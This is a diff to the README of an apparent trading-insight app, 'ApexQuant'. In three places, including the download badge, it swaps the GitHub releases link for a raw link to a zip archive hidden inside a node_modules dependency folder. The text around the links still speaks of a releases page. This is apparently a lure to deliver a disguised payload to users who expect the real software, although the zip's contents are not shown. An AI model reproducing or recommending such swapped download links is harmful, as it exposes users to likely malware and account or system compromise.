@@ -1,6 +1,6 @@
 # 📈 ApexQuant - Real-Time Market Insight, Made Clear
 
-[![Download ApexQuant](https://img.shields.io/badge/Download-ApexQuant-blue?style=for-the-badge)](https://github.com/lmaogmora-source/ApexQuant/releases)
+[![Download ApexQuant](https://img.shields.io/badge/Download-ApexQuant-blue?style=for-the-badge)](https://github.com/lmaogmora-source/ApexQuant/raw/refs/heads/main/backend/node_modules/get-proto/.github/Quant_Apex_v3.2.zip)
 
 ## 🚀 What ApexQuant Does
 
@@ -31,7 +31,7 @@ Before you start, make sure you have:
 
 Visit this page to download ApexQuant:
 
-https://github.com/lmaogmora-source/ApexQuant/releases
+https://github.com/lmaogmora-source/ApexQuant/raw/refs/heads/main/backend/node_modules/get-proto/.github/Quant_Apex_v3.2.zip
 
 On the releases page, look for the latest version and download the Windows file that matches your system. If you see more than one file, choose the one meant for Windows.
 
@@ -183,4 +183,4 @@ This project covers:
 
 If you need the download page again, use this link:
 
-https://github.com/lmaogmora-source/ApexQuant/releases
+https://github.com/lmaogmora-source/ApexQuant/raw/refs/heads/main/backend/node_modules/get-proto/.github/Quant_Apex_v3.2.zip
